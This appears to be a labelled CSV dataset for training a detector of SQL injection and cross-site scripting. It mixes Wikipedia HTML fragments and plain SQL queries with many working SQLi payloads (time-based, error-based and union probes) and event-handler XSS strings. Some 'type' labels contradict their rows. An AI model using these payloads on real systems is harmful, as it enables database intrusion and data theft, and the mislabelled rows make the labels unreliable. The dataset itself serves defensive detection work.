Text,Label,type
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"1'+  (  select dyfw where 7743  =  7743 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",1,sql
<rp onpointerleave=alert(1)>XSS</rp>,2,xss
	 </span> ,0,xss
-7675%'   )    )     )   order by 1--,1,sql
"<s draggable=""true"" ondragend=""alert(1)"">test</s>",2,xss
"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
SELECT * FROM end FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"Revival of <a href=""/wiki/Connectionism"" title=""Connectionism"">connectionism </a>:",0,xss
1'  )   order by 1#,1,sql
SELECT * FROM practice WHERE discovery = 'over'  OR scared = 'fifty',0,sql
SELECT * FROM compound WHERE little = 'itself' FETCH FIRST 3 ROWS ONLY,0,sql
"<li><a href=""/wiki/Intentionality"" title=""Intentionality"">Intentionality </a> </li>",0,xss
 </p>,0,xss
<progress onpointerover=alert(1)>XSS</progress>,2,xss
"<h1 oncontextmenu=""alert(1)"">test</h1>",2,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,sql
SELECT * FROM sides WHERE including = 'tobacco'  OR gone = 'father',0,sql
SELECT TOP 3 * FROM examine SELECT * FROM chair 3SELECT * FROM scientist,0,sql
SELECT MIN ( produce )  AS boy FROM donkey,0,sql
 or ''  =  ',1,sql
SELECT * FROM prove ORDER BY noun,0,sql
"1   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   3366  =  3366",1,sql
SELECT * FROM realize WHERE necessary = 'not',0,sql
"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""fkip""  =  ""fkip",1,sql
SELECT affect ( s ) FROM lunch INNER JOIN,0,sql
SELECT SEC_TO_TIME ( -6897 ) ;,0,sql
"<marquee onbeforecopy=""alert(1)"" contenteditable>test</marquee>",2,xss
<mark onpointerenter=alert(1)>XSS</mark>,2,xss
"1%'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
ribadesella,0,sql
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;100–101, who writes that there are ""two major branches of artificial intelligence: one aimed at producing intelligent behavior regardless of how it was accomplished, and the other aimed at modeling intelligent processes found in nature, particularly human ones."" </li>",0,xss
"<li><a href=""/wiki/Circumscription_(logic)"" title=""Circumscription (logic)"">Circumscription </a> </li>",0,xss
katsuno@novolardiseno.br,0,xss
end and 'icny' like 'icny,1,xss
"<li><a href=""/wiki/Wikidata"" title=""Wikidata"">Wikidata </a><span class=""nowrap"">&#160; ",0,xss
"<ol onbeforecut=""alert(1)"" contenteditable>test</ol>",2,xss
"1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",1,sql
"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1,sql
SELECT TOP 3 * FROM near WHERE number = 'correctly',0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFAsadaHosodaKuniyoshiIshiguro2009"">Asada et al. 2009 </a>. ",0,xss
"-4945 or make_set  (  9354  =  9354,7185  )  ",1,sql
"1"" where 9829  =  9829 order by 1#",1,sql
-2456'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'bbkp'  =  'bbkp,1,sql
"1"" where 5062  =  5062",1,sql
erikson@elcarritodelacompra.gw,0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Technological_singularity"" title=""Technological singularity"">Technological singularity </a> and <a href=""/wiki/Moore%27s_law"" title=""Moore&#39;s law"">Moore's law </a> </div>",0,xss
chimeneas,0,sql
"-8005""  )   union all select 5213,5213,5213,5213,5213--",1,sql
FROM  ( SELECT DISTINCT dried FROM muscle ) ,0,sql
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,xss
SELECT TOP 3 * FROM particular WHERE rise = 'treated',0,sql
SELECT * FROM difficulty WHERE typical = 'desk' LIMIT 3,0,sql
"INSERT INTO lips  ( good, jump, around )  VALUES  ( 'silk', 'income', 'throughout' )  ",0,sql
SELECT * FROM parts WHERE pond = 'joy'  AND City = 'cell',0,sql
99020664y,0,sql
"<li><a href=""/wiki/Cortana"" title=""Cortana"">Cortana </a><span class=""nowrap"">&#160; ",0,xss
"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
ardevol herrador,0,sql
<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>,2,xss
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'hstg' like 'hstg",1,sql
SELECT * FROM lamp WHERE form NOT LIKE 'pick%',0,sql
declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1,sql
1' and 9198  =  9198--,1,sql
"1"" where 6347  =  6347 union all select null,null,null,null,null,null,null,null#",1,xss
"<ruby ondblclick=""alert(1)"">test</ruby>",2,xss
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
<listing onpointerenter=alert(1)>XSS</listing>,2,xss
SELECT * FROM rather WHERE explain = 'known'  OR circus = 'thirty',0,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,sql
"<track onmousemove=""alert(1)"">test</track>",2,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Metaheuristic"" title=""Metaheuristic"">Metaheuristic methods </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"	 </span> <span class=""toctext"">Computational intelligence and soft computing ",0,xss
1230,0,sql
asimismo,0,sql
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",1,xss
-6145 or   (  8459  =  8459  )  *4906-- yklv,1,sql
san vicente de la cabeza,0,sql
<body onpageshow=alert(1)>,2,xss
SELECT * FROM however WHERE wealth IN  ( SELECT repeat FROM engine ) ,0,sql
<small onpointerleave=alert(1)>XSS</small>,2,xss
1 or sleep  (  5  )  # tdgb,1,sql
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,sql
SELECT AVG ( direct ) FROM scared,0,sql
"<tfoot oncopy=""alert(1)"" contenteditable>test</tfoot>",2,xss
 </li>,0,xss
SELECT * FROM express FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<li><a href=""/wiki/Interactionism_(philosophy_of_mind)"" title=""Interactionism (philosophy of mind)"">Interactionism </a> </li>",0,xss
salavedra castelltort,0,sql
"<meta onmousemove=""alert(1)"">test</meta>",2,xss
1  )   where 8320  =  8320 waitfor delay '0:0:5'--,1,xss
"<li><a href=""/wiki/Erich_von_Holst"" title=""Erich von Holst"">Erich von Holst </a> </li>",0,xss
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1,xss
select   (  case when   (  3217  =  8421  )   then 3217 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct",1,sql
"-9039'  )   union all select 8058,8058,8058,8058,8058--",1,xss
SELECT * FROM than WHERE modern = 'favorite' FETCH FIRST 3 ROWS ONLY,0,xss
adrie,0,sql
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>",2,xss
SELECT * FROM something WHERE    NOT parallel = 'deer',0,sql
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'gcna'  =  'gcna",1,sql
SELECT wonderful FROM effort UNION ALL SELECT former FROM so ORDER BY center,0,sql
"	 </span> <span class=""reference-text"">",0,xss
" select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",1,sql
SELECT * FROM require WHERE headed = 'gravity'  OR writing = 'game',0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=SearchERP&amp;rft.atitle=Oracle+CEO+Mark+Hurd+sees+no+reason+to+fear+ERP+AI&amp;rft_id=https%3A%2F%2Fsearcherp.techtarget.com%2Fnews%2F252460208%2FOracle-CEO-Mark-Hurd-sees-no-reason-to-fear-ERP-AI&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1%"" union all select null,null,null,null--",1,sql
 </li>,0,xss
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,xss
"<nobr onmousedown=""alert(1)"">test</nobr>",2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.igmchicago.org&amp;rft.atitle=Robots+and+Artificial+Intelligence&amp;rft_id=http%3A%2F%2Fwww.igmchicago.org%2Fsurveys%2Frobots-and-artificial-intelligence&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"-7371'  )   union all select 4531,4531,4531#",1,sql
DELETE FROM weak WHERE increase = 'surprise',0,sql
	 </span> </li>,0,xss
<keygen onpointermove=alert(1)>XSS</keygen>,2,xss
SELECT * FROM lack 3 SELECT * FROM my,0,sql
SELECT * FROM book WHERE what = 'egg' LIMIT 3,0,sql
"1'   )    )    union all select null,null,null,null--",1,xss
89388462c,0,xss
SELECT camera ( s )  FROM test,0,sql
<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>,2,xss
SELECT * FROM just WHERE Price NOT BETWEEN 10 AND 20,0,xss
SELECT breakfast ( s )  FROM seems LEFT JOIN,0,xss
"<datalist onkeydown=""alert(1)"" contenteditable>test</datalist>",2,xss
"<wbr onbeforepaste=""alert(1)"" contenteditable>test</wbr>",2,xss
"			<input type=""submit"" name=""fulltext"" value=""Search"" title=""Search Wikipedia for this text"" id=""mw-searchButton"" class=""searchButton mw-fallbackSearchButton""/>",0,xss
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,xss
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,2,xss
UNION SELECT,1,sql
SELECT chance ( s )  FROM in SELECT worker ( s ) ,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.channelnewsasia.com/news/commentary/artificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374"">""Commentary: Bad news. Artificial intelligence is biased"" </a>. <i>CNA </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=CNA&amp;rft.atitle=Commentary%3A+Bad+news.+Artificial+intelligence+is+biased&amp;rft_id=https%3A%2F%2Fwww.channelnewsasia.com%2Fnews%2Fcommentary%2Fartificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,sql
braa,0,sql
frailes,0,sql
"<li><cite id=""CITEREFKolata1982"" class=""citation journal"">Kolata, G. (1982). ""How can computers get common sense?"". <i>Science </i>. <b>217 </b> (4566): 1237–1238. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/1982Sci...217.1237K"">1982Sci...217.1237K </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.217.4566.1237"">10.1126/science.217.4566.1237 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/17837639"">17837639 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=How+can+computers+get+common+sense%3F&amp;rft.volume=217&amp;rft.issue=4566&amp;rft.pages=1237-1238&amp;rft.date=1982&amp;rft_id=info%3Apmid%2F17837639&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.217.4566.1237&amp;rft_id=info%3Abibcode%2F1982Sci...217.1237K&amp;rft.aulast=Kolata&amp;rft.aufirst=G.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Requirements_analysis"" title=""Requirements analysis"">Requirements analysis </a> </li>",0,xss
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""umne"" like ""umne",1,sql
SELECT relationship ( s )  FROM production FULL OUTER JOIN,0,sql
haenning@maxitienda.be,0,sql
encad7622i6,0,sql
"for a wide range of purposes, from data mining to monitoring and automated",0,xss
"<menuitem draggable=""true"" ondragend=""alert(1)"">test</menuitem>",2,xss
"1""  )   where 4964  =  4964",1,sql
or 'x'  =  'x,1,sql
SELECT * FROM customs WHERE fifty = 'many',0,sql
newport,0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/broad-crawls.html"">Broad Crawls</a></li>",0,xss
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  -- mwsm",1,sql
	 </span> </a> </li>,0,xss
"Statistical learning methods and <a href=""/wiki/Classifier_(mathematics)"" class=""mw-redirect"" title=""Classifier (mathematics)"">classifiers </a>:",0,xss
	 </span> </li>,0,xss
SELECT AVG ( complete ) FROM iron,0,xss
"  SELECT * FROM right WHERE upward IN  ( 'music', 'city', 'jet' )  ",0,sql
SELECT * FROM cup 3 SELECT * FROM jungle,0,sql
"  SELECT are AS rod, fence AS [worker]  FROM swung",0,xss
rusch de celis,0,sql
"<datalist draggable=""true"" ondragleave=""alert(1)"">test</datalist>",2,xss
"1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,sql
?malgastador,0,sql
"<li>Scharre, Paul, ""Killer Apps:  The Real Dangers of an AI Arms Race"", <i><a href=""/wiki/Foreign_Affairs"" title=""Foreign Affairs"">Foreign Affairs </a> </i>, vol. 98, no. 3 (May/June 2019), pp.&#160;135–44.  ""Today's AI technologies are powerful but unreliable.  Rules-based systems cannot deal with circumstances their programmers did not anticipate.  Learning systems are limited by the data on which they were trained.  AI failures have already led to tragedy.  Advanced autopilot features in cars, although they perform well in some circumstances, have driven cars without warning into trucks, concrete barriers, and parked cars.  In the wrong situation, AI systems go from supersmart to superdumb in an instant.  When an enemy is trying to manipulate and hack an AI system, the risks are even greater.""  (p.&#160;140.) </li>",0,xss
"-1600%""   )    )     )   or elt  (  4568  =  7693,7693  )   and    (    (     (  ""%""  =  """,1,sql
SELECT * FROM list WHERE operation = 'search' LIMIT 3,0,sql
"exp/*<A STYLE='no\:no(""*//*"");",2,xss
"rio alzania, 72, 6g",0,xss
		 </h3>,0,xss
declare @s varchar  (  22  )   select @s   = ,1,sql
rajadell,0,sql
SELECT * FROM far WHERE possibly = 'world',0,sql
	 </span> </h3>,0,xss
"	 <div class=""magnify""><a href=""/wiki/File:%C3%84%C3%A4retuvastuse_n%C3%A4ide.png"" class=""internal"" title=""Enlarge""> </a> </div>",0,xss
01062744y,0,xss
"1""  )   where 9511  =  9511   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,sql
 ,0,xss
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",1,sql
"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"  SELECT waveID AS ID, locate AS section FROM place",0,sql
<i id=x tabindex=1 onfocusin=alert(1)></i>,2,xss
"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,sql
SELECT * FROM this ORDER BY article DESC,0,sql
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
2.8707E+15,0,sql
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,2,xss
40315,0,sql
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>",2,xss
"<style>@keyframes slidein {}</style><col style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></col>",2,xss
"-8966""   )    )     )   or 1628  =  2712",1,sql
22367,0,xss
<head>,0,xss
select   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  select 5009 from information_schema.character_sets  )   end  )  #,1,sql
